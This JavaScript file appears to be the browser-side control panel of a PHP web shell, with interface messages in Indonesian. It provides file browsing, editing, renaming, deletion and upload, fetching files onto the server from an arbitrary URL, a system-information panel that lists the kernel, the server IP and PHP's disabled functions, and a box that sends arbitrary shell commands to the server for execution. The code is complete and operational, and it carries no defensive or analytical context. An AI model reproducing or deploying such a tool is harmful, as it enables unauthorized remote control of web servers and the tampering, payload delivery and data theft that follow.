let currentPath = "";
let editingFile = "";
let currentPage = 1;

function showNotification(message, type = "success") {
  const notification = document.getElementById("notification");
  notification.className = `notification ${type}`;
  notification.textContent = message;
  notification.style.display = "block";

  setTimeout(() => {
    notification.style.display = "none";
  }, 3000);
}

function setTheme(theme) {
  document.documentElement.setAttribute("data-theme", theme);
  localStorage.setItem("theme", theme);
  const btn = document.getElementById("themeBtn");
  if (theme === "dark") {
    btn.innerHTML =
      '<i class="fa-duotone fa-solid fa-sun-cloud" style="color: var(--sun-icon-color);"></i> Light Mode';
  } else {
    btn.innerHTML =
      '<i class="fa-duotone fa-regular fa-moon-stars" style="color: var(--moon-icon-color);"></i> Dark Mode';
  }
}

function showSysInfo() {
  fetch("", {
    method: "POST",
    headers: { "Content-Type": "application/x-www-form-urlencoded" },
    body: "action=sysinfo",
  })
    .then((r) => r.json())
    .then((response) => {
      if (response.status === "success") {
        const info = response.data;
        let html = `
                <table style="margin-top: 10px;">
                    <tr><td><b>Kernel</b></td><td>: ${info.kernel}</td></tr>
                    <tr><td><b>Server IP</b></td><td>: ${info.server_ip}</td></tr>
                    <tr><td><b>Your IP</b></td><td>: ${info.user_ip}</td></tr>
                    <tr><td><b>Server Software</b></td><td>: ${info.server_software}</td></tr>
                    <tr><td><b>PHP Version</b></td><td>: ${info.php_version}</td></tr>
                    <tr><td><b>Disable Functions</b></td><td>: ${info.disable_functions}</td></tr>
                </table>
            `;
        document.getElementById("sysInfoContent").innerHTML = html;
        document.getElementById("sysInfoModal").style.display = "block";
      }
    });
}

function toggleTheme() {
  const currentTheme = localStorage.getItem("theme") || "light";
  const newTheme = currentTheme === "light" ? "dark" : "light";
  setTheme(newTheme);
}

window.onclick = function (event) {
  const modal = document.getElementById("sysInfoModal");
  if (event.target === modal) {
    modal.style.display = "none";
  }
};

// Load saved theme
document.addEventListener("DOMContentLoaded", () => {
  const savedTheme = localStorage.getItem("theme") || "light";
  setTheme(savedTheme);
});

function formatSize(bytes) {
  const sizes = ["B", "KB", "MB", "GB"];
  const i = Math.floor(Math.log(bytes) / Math.log(1024));
  return Math.floor(bytes / Math.pow(1024, i)) + " " + sizes[i];
}

function updateBreadcrumb(path) {
  const parts = path.split("/").filter(Boolean);
  let html = '<a href="#" onclick="navigateTo(\'\')">[ HOME DIR ]</a>';
  let fullPath = "";
  parts.forEach((part) => {
    fullPath += part + "/";
    html += ` / <a href="#" onclick="navigateTo('${fullPath}')">${part}</a>`;
  });
  document.getElementById("breadcrumb").innerHTML = html;
}

function loadFiles() {
  fetch("", {
    method: "POST",
    headers: { "Content-Type": "application/x-www-form-urlencoded" },
    body: `action=list&path=${encodeURIComponent(
      currentPath
    )}&page=${currentPage}`,
  })
    .then((r) => r.json())
    .then((data) => {
      if (data.status !== "success") return;
      updateBreadcrumb(data.current_path);

      const foldersHtml = data.folders
        .map(
          (f) => `
            <tr class="folder-row">
                <td><i class="fa-duotone fa-light fa-folder-closed" style="color: var(--folder-icon-color);"></i> <a href="#" class="folder_name" onclick="navigateTo('${currentPath}${f.name}/')">${f.name}</a></td>
                <td>-</td><td>${f.modified}</td><td>${f.owner}</td>
                <td class="actions">
                    <button onclick="renameItem('${f.name}')">Rename</button>
                    <button onclick="deleteItem('${f.name}')">Delete</button>
                </td>
            </tr>
        `
        )
        .join("");

      const filesHtml = data.files
        .map(
          (f) => `
            <tr>
                <td><i class="fa-solid fa-memo"></i> <a href="#" onclick="editFile('${
                  f.name
                }')">${f.name}</a></td>
                <td>${formatSize(f.size)}</td><td>${f.modified}</td><td>${
            f.owner
          }</td>
                <td class="actions">
                    <button onclick="editFile('${f.name}')">Edit</button>
                    <button onclick="renameItem('${f.name}')">Rename</button>
                    <button onclick="deleteItem('${f.name}')">Delete</button>
                </td>
            </tr>
        `
        )
        .join("");

      document.getElementById("fileList").innerHTML = foldersHtml + filesHtml;

      // Update pagination
      updatePagination(data.pagination);
    });
}

function updatePagination(pagination) {
  const { current_page, total_pages, total_items } = pagination;
  if (total_pages <= 1) {
    document.getElementById("pagination").innerHTML = "";
    return;
  }

  let paginationHtml = `<div style="margin-bottom: 60px;">`;
  paginationHtml += `<div style="margin-bottom: 10px;">Total: ${total_items} items</div>`;

  if (current_page > 1) {
    paginationHtml += `<button onclick="changePage(${
      current_page - 1
    })">Previous</button> `;
  }

  for (let i = 1; i <= total_pages; i++) {
    if (i === current_page) {
      paginationHtml += `<button style="background: var(--td-hover);">${i}</button> `;
    } else {
      paginationHtml += `<button onclick="changePage(${i})">${i}</button> `;
    }
  }

  if (current_page < total_pages) {
    paginationHtml += `<button onclick="changePage(${
      current_page + 1
    })">Next</button>`;
  }

  paginationHtml += "</div>";
  document.getElementById("pagination").innerHTML = paginationHtml;
}

function changePage(page) {
  currentPage = page;
  loadFiles();
}

function navigateTo(path) {
  currentPath = path;
  currentPage = 1;
  loadFiles();
}

function uploadFile() {
  const fileInput = document.getElementById("uploadFile");
  const file = fileInput.files[0];
  if (!file) return;
  const formData = new FormData();
  formData.append("action", "upload");
  formData.append("path", currentPath);
  formData.append("file", file);
  fetch("", { method: "POST", body: formData })
    .then((r) => r.json())
    .then((response) => {
      if (response.status === "success") {
        showNotification("File berhasil diupload");
        fileInput.value = "";
        loadFiles();
      } else {
        showNotification(response.message || "Gagal upload file", "error");
      }
    })
    .catch((err) => showNotification("Error: " + err, "error"));
}

function remoteUpload() {
  const url = document.getElementById("remoteUrl").value.trim();
  if (!url) {
    showNotification("Mohon Masukan URL dengan benar", "error");
    return;
  }

  fetch("", {
    method: "POST",
    headers: { "Content-Type": "application/x-www-form-urlencoded" },
    body: `action=remote_upload&path=${encodeURIComponent(
      currentPath
    )}&url=${encodeURIComponent(url)}`,
  })
    .then((r) => r.json())
    .then((response) => {
      if (response.status === "success") {
        showNotification("Berhasil Mengupload File Melalui URL");
        document.getElementById("remoteUrl").value = "";
        loadFiles();
      } else {
        showNotification(response.message || "Gagal mengupload file", "error");
      }
    })
    .catch((err) => showNotification("Error: " + err, "error"));
}

function createFolder() {
  const name = document.getElementById("newFolder").value.trim();
  if (!name) return;
  fetch("", {
    method: "POST",
    headers: { "Content-Type": "application/x-www-form-urlencoded" },
    body: `action=create_folder&path=${encodeURIComponent(
      currentPath
    )}&folder_name=${encodeURIComponent(name)}`,
  })
    .then((r) => r.json())
    .then((response) => {
      if (response.status === "success") {
        showNotification("Folder Baru Berhasil Dibuat");
        document.getElementById("newFolder").value = "";
        loadFiles();
      } else {
        showNotification(
          response.message || "Gagal Membuat Folder Baru",
          "error"
        );
      }
    })
    .catch((err) => showNotification("Error: " + err, "err"));
}

function createFile() {
  const name = document.getElementById("newFile").value.trim();
  if (!name) return;
  fetch("", {
    method: "POST",
    headers: { "Content-Type": "application/x-www-form-urlencoded" },
    body: `action=create_file&path=${encodeURIComponent(
      currentPath
    )}&filename=${encodeURIComponent(name)}`,
  })
    .then((r) => r.json())
    .then((response) => {
      if (response.status === "success") {
        showNotification("File Baru Berhasil Dibuat");
        document.getElementById("newFile").value = "";
        loadFiles();
        editFile(name);
      } else {
        showNotification(
          response.message || "Gagal Membuat File Baru",
          "error"
        );
      }
    })
    .catch((err) => showNotification("Error" + err, "error"));
}

function editFile(name) {
  editingFile = currentPath + name;
  fetch("", {
    method: "POST",
    headers: { "Content-Type": "application/x-www-form-urlencoded" },
    body: `action=read_file&path=${encodeURIComponent(editingFile)}`,
  })
    .then((r) => r.json())
    .then((data) => {
      if (data.status === "success") {
        document.getElementById("fileContent").value = data.content;
        document.getElementById("editModal").style.display = "block";
      }
    });
}

function saveFile() {
  fetch("", {
    method: "POST",
    headers: { "Content-Type": "application/x-www-form-urlencoded" },
    body: `action=save_file&path=${encodeURIComponent(
      editingFile
    )}&content=${encodeURIComponent(
      document.getElementById("fileContent").value
    )}`,
  })
    .then((r) => r.json())
    .then((response) => {
      if (response.status === "success") {
        showNotification("File berhasil disimpan");
        loadFiles();
      } else {
        showNotification(response.message || "Gagal menyimpan file", "error");
      }
    })
    .catch((err) => showNotification("Error: " + err, "error"));
}

//trigger ctrl + s for save file
document.addEventListener("keydown", function (e) {
  const editModal = document.getElementById("editModal");
  if (editModal.style.display === "block") {
    if ((e.ctrlKey || e.metaKey) && e.key === "s") {
      e.preventDefault();
      saveFile();
    }
  }
});

//trigger close modal with esc / ctrl x
document.addEventListener("keydown", function (e) {
  const editModal = document.getElementById("editModal");
  if (editModal.style.display === "block") {
    if ((e.ctrlKey || e.metaKey) && e.key === "s") {
      e.preventDefault();
      saveFile();
    }

    if (e.key === "Escape") {
      e.preventDefault();
      closeModal();
    }

    if (e.ctrlKey && e.key === "x") {
      e.preventDefault();
      closeModal();
    }
  }
});

function closeModal() {
  document.getElementById("editModal").style.display = "none";
  document.getElementById("fileContent").value = "";
  editingFile = "";
}

function renameItem(name) {
  const newName = prompt("Masukkan nama baru:", name);
  if (!newName || newName === name) return;
  fetch("", {
    method: "POST",
    headers: { "Content-Type": "application/x-www-form-urlencoded" },
    body: `action=rename&old_path=${encodeURIComponent(
      currentPath + name
    )}&new_path=${encodeURIComponent(currentPath + newName)}`,
  })
    .then((r) => r.json())
    .then((response) => {
      if (response.status === "success") {
        showNotification("Rename Berhasil");
        loadFiles();
      } else {
        showNotification(response.message || "Rename Gagal", "error");
      }
    })
    .catch((err) => showNotification("Error :" + err, "error"));
}

function deleteItem(name) {
  if (!confirm("Hapus " + name + "?")) return;
  fetch("", {
    method: "POST",
    headers: { "Content-Type": "application/x-www-form-urlencoded" },
    body: `action=delete&path=${encodeURIComponent(currentPath + name)}`,
  })
    .then((r) => r.json())
    .then((response) => {
      if (response.status === "success") {
        showNotification("Berhasil Menghapus");
        loadFiles();
      } else {
        showNotification(response.message || "Gagal Menhapus", "error");
      }
    })
    .catch((err) => showNotification("Error :" + err, "error"));
}

function executeCmd() {
  const cmd = document.getElementById("cmdInput").value.trim();
  if (!cmd) return;

  fetch("", {
    method: "POST",
    headers: { "Content-Type": "application/x-www-form-urlencoded" },
    body: `action=execute&cmd=${encodeURIComponent(
      cmd
    )}&current_path=${encodeURIComponent(currentPath)}`,
  })
    .then((r) => r.json())
    .then((response) => {
      if (response.status === "success") {
        document.getElementById("cmdOutput").value = response.output;
      } else {
        document.getElementById("cmdOutput").value =
          response.message || "Error executing command";
      }
    })
    .catch((err) => {
      document.getElementById("cmdOutput").value = "Error: " + err;
    });
}

//trigger enter cmd input
document.addEventListener("DOMContentLoaded", function () {
  document
    .getElementById("cmdInput")
    .addEventListener("keypress", function (e) {
      if (e.key === "Enter") {
        executeCmd();
      }
    });
});

loadFiles();
